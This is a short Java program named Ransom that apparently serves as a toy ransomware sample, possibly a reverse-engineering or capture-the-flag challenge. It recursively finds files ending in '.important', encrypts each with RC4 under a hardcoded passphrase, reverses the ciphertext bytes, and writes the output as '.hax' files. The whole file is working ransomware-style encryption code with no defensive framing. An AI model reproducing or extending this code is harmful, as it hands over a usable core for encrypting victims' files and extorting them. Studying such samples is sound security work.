import java.io.File;
import java.nio.file.*;
import java.util.stream.Collectors;
import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;

public class Ransom {

    private static final String ALGORITHM_NAME = "RC4";
    private static final SecretKey SECRET_KEY = new SecretKeySpec("Long passphrase are always secure :)".getBytes(), ALGORITHM_NAME);

    public static void main(String[] args) throws Exception {
        var cipher = Cipher.getInstance(ALGORITHM_NAME);

        try (var stream = Files.walk(Paths.get("."))) {
            var files = stream.filter((file) -> Files.isRegularFile(file) && file.toString().endsWith(".important"))
                .collect(Collectors.toList());

            for(Path p : files) {
                var data = Files.readAllBytes(p);
                var encrypted = encrypt(data, cipher);

                Files.write(new File(p.toString() + ".hax").toPath(), encrypted);
            }
        }
    }

    private static byte[] encrypt(byte[] data, Cipher cipher) throws Exception {
        cipher.init(Cipher.ENCRYPT_MODE, SECRET_KEY);
        var encrypted = cipher.doFinal(data);

        var securelyEncrypted = new byte[encrypted.length];
        for(var i = 0; i < encrypted.length; ++i) {
            securelyEncrypted[i] = encrypted[encrypted.length - i - 1];
        }

        return securelyEncrypted;
    }
}
